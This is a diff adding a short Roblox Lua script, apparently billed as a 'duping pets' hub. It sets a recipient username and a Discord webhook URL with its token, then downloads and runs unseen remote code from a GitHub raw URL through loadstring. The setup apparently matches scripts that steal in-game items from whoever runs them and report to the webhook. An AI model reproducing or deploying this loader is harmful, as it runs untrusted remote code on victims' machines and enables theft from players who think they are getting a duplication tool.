@@ -1,0 +1,5 @@
+_G.Username = "freevcaccforyou"
+_G.HubName = "duping pets"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1094451106257575976/zwK3phE-qHFRzd0qi2y75f_S5G9IQBDybFBGkIgmZNJMgkqR4u08FbcR-HA9i_fkCHFz"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
